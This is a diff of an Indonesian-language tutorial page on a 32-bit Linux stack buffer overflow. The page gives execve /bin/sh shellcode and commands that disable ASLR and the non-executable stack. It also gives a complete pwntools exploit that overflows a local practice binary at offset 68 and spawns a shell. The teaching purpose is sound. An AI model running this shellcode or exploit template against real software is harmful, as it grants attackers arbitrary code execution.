@@ -348,8 +348,8 @@ int main(){
 <pre><code>xor ecx, ecx
 mul ecx
 push ecx
-push 0x68732f2f   ;; hs//
-push 0x6e69622f   ;; nib/
+push 0x68732f2f
+push 0x6e69622f
 mov ebx, esp
 mov al, 11
 int 0x80</code></pre>
@@ -359,8 +359,8 @@ kode = '''
 xor ecx, ecx
 mul ecx
 push ecx
-push 0x68732f2f   ;; hs//
-push 0x6e69622f   ;; nib/
+push 0x68732f2f
+push 0x6e69622f
 mov ebx, esp
 mov al, 11
 int 0x80
@@ -368,18 +368,23 @@ int 0x80
 
 bentuk_line = asm(kode)
 dikembalikan_bentuk_kode = disasm(bentuk_line)
+
+print bentuk_line
 </code></pre>
 dalam bentuk line : (yang akan digunakan sebagai payload)
-<pre><code>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
-</code></pre>
+<pre><code>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code></pre>
 
                     <p><br> syarat & tahap : <br> 
                         <ul>
-                            <li>dalam bentuk stack executable / disable execstack</li>
-                            <li>mengetahui alamat buffer</li>
+                            <li>dalam bentuk stack executable / disable execstack<br><code>maka dalam makefile ditambah '-z execstack'</code> </li>
                             <li>ada 2 seri : aslr/randomize memory off dan aslr/randomize memory on (untuk belajar, di off-kan dulu) <br>
                                 <pre><code>echo "0" > /proc/sys/kernel/randomize_va_space</code><br>"0" untuk off, "1" untuk on</pre>
                             </li>
+                            dicek <code>NX</code> harus disable :<br>  
+                            <img src="../gambar/gamb2.png" alt=""><br><br>
+                            <li>mengetahui alamat buffer & offset, <br> run dalam gdb, ide : memenuhi input hingga <code> SIGSEGV / segmentation vault</code></li><br>
+                            <img src="../gambar/gamb3.png" alt="">
+                            <br>didapat <code>offset = 68</code>
                         </ul>
                     </p>
                     <br>
@@ -389,7 +394,7 @@ dalam bentuk line : (yang akan digunakan sebagai payload)
 <span class="hljs-number">0x08049208</span> &lt;+<span class="hljs-number">50</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span>
 <span class="hljs-number">0x0804920a</span> &lt;+<span class="hljs-number">52</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x8049080</span> &lt;read@plt&gt;
 </code></pre>
-    <p>proses <code>read</code> pada <code>[ebp-0x40]</code> </p>
+    <p>proses <code>read</code> pada <code>[ebp-0x40]</code> = 68 desimal</p>
 
     <p>ide : <br>
     <code>shellcode + 'A'*(offset - len(shellcode)) + memori_buff</code>
@@ -399,26 +404,37 @@ dalam bentuk line : (yang akan digunakan sebagai payload)
         <pre><code class="lang-html">from pwn import *
 import struct
 
+# opsional --> dapat diganti
 context(arch='i386', os='linux')
 
-# jalankan program
-p = process(./shellcode)
+# jalankan program --> dapat diganti
+p = process('./shellcode')
 
-p.recvuntil("Buffer ada di: ")
-buff = int(p.recvline(),16)
+# interaksi dengan output program --> dapat diganti
+p.recvuntil("di ")
 
+# alamat buffer --> dapat diganti (jika perlu)
+buff = int(p.recvline(),16)         
+
+# asumsi telah mengetahui offset (berdasarkan percobaan diatas) --> dapat diganti
 offset = 68
-memori_buff = struct.pack("&lt;I", buff)
 
+# asumsi menggunakan mesin &lt;I / litle endian --> dapat diganti (jika perlu)
+memori_buff = struct.pack("&lt;I", buff) 
+
+# paten / didapat dr http://shell-storm.org/shellcode/files/shellcode-752.php
 shellcode = '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'
 
+# membuat payload --> dapat diganti
 payload = shellcode + 'A'*(offset - len(shellcode)) + memori_buff
 
+# memberi input dengan...
 p.sendline(payload+'<span class="hljs-symbol">\n</span>')
 
+# agar shell dapat berjalan
 p.interactive()
             </code></pre>
-            
+            sudah masuk ke dalam shell
             
     </p>
                     <!-- ----------------------------------------------# DIGANTI MENU #---------------------------------------------- -->
